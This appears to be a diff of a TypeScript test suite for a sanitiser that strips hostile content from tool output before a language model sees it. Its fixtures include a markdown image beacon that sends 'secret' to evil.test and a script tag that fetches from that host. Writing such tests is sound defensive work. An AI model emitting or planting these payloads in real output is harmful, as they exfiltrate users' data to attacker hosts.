@@ -346,13 +346,13 @@ describe("executeJqQuery — JSON grammar (RC-8: markup/markdown stages excluded
         expect(result.content[0].text).toContain(beacon);
     });
 
-    it("the wrap does not strip it either — the result is marked defended", async () => {
-        // The composition is the claim. `jq_query` ran the pipeline's JSON arm,
-        // so the wrap defers rather than re-deciding the grammar from text
-        // whose content type it can no longer see. Without the tag the wrap's
-        // strictest-grammar arm would rewrite this to `[image removed]`, and
-        // `save_to_file` would have persisted one thing while the model saw
-        // another.
+    it("but the wrap DOES strip it before the model sees it (RC-10)", async () => {
+        // The split RC-10 draws: what `jq_query` RETURNS is defended as
+        // model-facing text, and what `save_to_file` PERSISTS keeps the JSON
+        // exemption. The file stays a faithful copy of the origin's bytes; the
+        // model gets the beacon removed. Divergence between the two is the
+        // intended design here, not an oversight — the file is the artefact and
+        // the returned text is a rendering of it.
         const file = join(allowedDir, "beacon2.json");
         const beacon = "![x](https://evil.test/?d=secret)";
         await writeFile(file, JSON.stringify({ note: `see ${beacon}` }), "utf-8");
@@ -362,7 +362,8 @@ describe("executeJqQuery — JSON grammar (RC-8: markup/markdown stages excluded
             {}
         );
         const wrapped = createWrapper({})(result, "jq");
-        expect(wrapped.content[0].text).toContain(beacon);
+        expect(wrapped.content[0].text).not.toContain("evil.test");
+        expect(wrapped.content[0].text).toContain("[image removed]");
     });
 
     it("still sanitises Unicode attack characters concentrated by the filter", async () => {
@@ -385,11 +386,11 @@ describe("executeJqQuery — JSON grammar (RC-8: markup/markdown stages excluded
         expect(result.content[0].text).toContain("okeviltext");
     });
 
-    it("an ERROR result is NOT marked defended — the wrap defends it in full", async () => {
+    it("an ERROR result is defended in full by the wrap", async () => {
         // The error text embeds exception messages, and `applyJqFilter`'s
         // invalid-JSON error quotes a preview of the file it was reading.
         // Foreign bytes in a message this process formatted are still foreign
-        // bytes, so the error path keeps the untagged default.
+        // bytes.
         const file = join(allowedDir, "notjson.txt");
         await writeFile(file, "<script>fetch('https://evil.test')</script>", "utf-8");
 
